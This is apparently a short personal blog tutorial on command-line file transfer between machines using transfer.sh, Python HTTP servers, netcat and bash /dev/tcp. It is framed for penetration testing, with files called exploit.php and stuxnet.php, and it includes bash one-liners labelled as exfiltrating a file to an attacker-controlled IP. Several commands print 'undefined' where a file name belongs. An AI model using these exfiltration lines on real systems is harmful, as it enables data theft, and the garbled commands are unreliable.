---
title: 4 Ways To Quickly Transfer Files
publishedOn: Febuary 5th, 2023
slug: transfer-files
excerpt: I want to cover a few ways to easily transfer files inside the command line. My personal go to is a Python server and curl/wget request on the client side. I also really like curls --upload-file utility because it will actually present a QR code, sharable page, and a specific URL you can now use on the client side. Netcat's transfer is very easy as well but we will see all the different options in this blog article. I will list them in order of how I favor them. 
readingTime: 5 mins
---

# Transfering Files

# **#1 Curl's Transfer.sh Utility**
Cur's Transfer.sh Utility, and will upload it to a specific transfer.sh server. It's relatively new but for me has worked everywhere. I like it because you do not need to mess with checking IP addresses, Ngrok, if you are in/out network, etc. It works 100% of the time, regardless of any of that. It will give you a sharable web page, QR code, and as soon as you finish the upload a link for that. You can also just use that link to make a curl request and download the file, which is what I typically do. 

The following command uploads the file to the transfer.sh servers...

`curl --upload-file ./file.txt https://transfer.sh/Myfile.txt`

***This will give a URL that looks something like this...***

`https://transfer.sh/A3a3KL/Myfile.txt`

To download the file on the client side, enter the following command...

`curl https://transfer.sh/<CodeFromAbove>/Myfile.txt -o Myfile.txt`

***-o for output, can be named anything.***

# **#2 Python**
Python is the next easiest for me, just out of familiarity. Python3 specifically but both are easy.

*Anything written in python2 will almost always break in python3. So we also look at how to transfer a file using python3.*

## **Python3**

In the case of python3, enter the following command to start a simple python server...

`python3 -m http.server 8080`

***^ Make sure you are in the correct directoy prior to starting server.***

To download the file on the target, enter the following command...

`wget http://192.168.43.177:8080/exploit.php`

## **Python2**
----------
Switch to the directory where the file that you want to transfer exists. Start a simple python server. Enter the following command...

`python -m SimpleHTTPServer 8080`

Now go to the machine where you want to transfer the file. Use the following command to download the file...

`wget http://192.168.43.177:8080/stuxnet.php`

# #3 Netcat
Netcat has always been an easy option for trasnfering and just about anything else.

Netcat is a powerful utility to transfer files from any remote machine to a local device. It may not always be installed. You can check whether it exists or not by entering...

`which nc`
`which netcat`

Make a netcat server with the following command...

`nc -nlvp 8080 < stuxnet.php`

Now go to the target machine and enter the following to download the file...

`nc -nv 192.168.43.177 8080 > stuxnet.php`

# #4 Bash Upload
**I've never really used this method. Transfer.sh, Python, and Netcat work perfectly so I've never needed this. I have used similiar bash commands for reverse shells.**
### **Upload file over HTTP (require HTTP service running on the attacker machine)below...**

`bash -c 'echo -e "POST / HTTP/0.9 $(<undefined)" > /dev/tcp/127.0.0.1/6969'`
----------------------------
### **Exfiltrate file over TCP# Listen with Netcat on port 6969 + output redirection below...**

`bash -c 'cat undefined > /dev/tcp/<IPADDRESS>/6969'`

----------------------------
## Bash Download on Client Side

`bash -c 'cat < /dev/tcp/<IPADDRESS>/6969 > undefined'`